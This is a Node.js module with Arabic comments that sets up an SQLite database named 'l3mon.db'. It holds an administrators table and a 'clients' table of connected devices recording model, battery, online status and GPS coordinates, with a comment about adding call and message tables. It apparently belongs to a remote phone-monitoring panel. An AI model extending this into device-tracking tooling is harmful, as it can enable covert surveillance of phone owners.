const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

// تحديد مسار ملف قاعدة البيانات
const dbPath = path.join(__dirname, 'l3mon.db');

// التأكد من أن المجلد موجود (لن يضر)
const dbDir = path.dirname(dbPath);
if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
}

// إنشاء قاعدة البيانات وفتحها
const db = new sqlite3.Database(dbPath);

// إنشاء الجداول الأساسية تلقائياً عند أول تشغيل
db.serialize(() => {
    // جدول المستخدمين (المشرفين)
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        salt TEXT,
        token TEXT,
        createdAt TEXT
    )`);

    // جدول الأجهزة المتصلة (العملاء)
    db.run(`CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT UNIQUE,
        name TEXT,
        os TEXT,
        model TEXT,
        battery TEXT,
        isOnline INTEGER DEFAULT 0,
        latitude TEXT,
        longitude TEXT,
        createdAt TEXT,
        updatedAt TEXT,
        user_id INTEGER
    )`);

    // يمكنك إضافة جداول أخرى (المكالمات، الرسائل، إلخ) لاحقاً إذا احتجتها
    console.log('[DB] SQLite ready and tables ensured.');
});

module.exports = db;
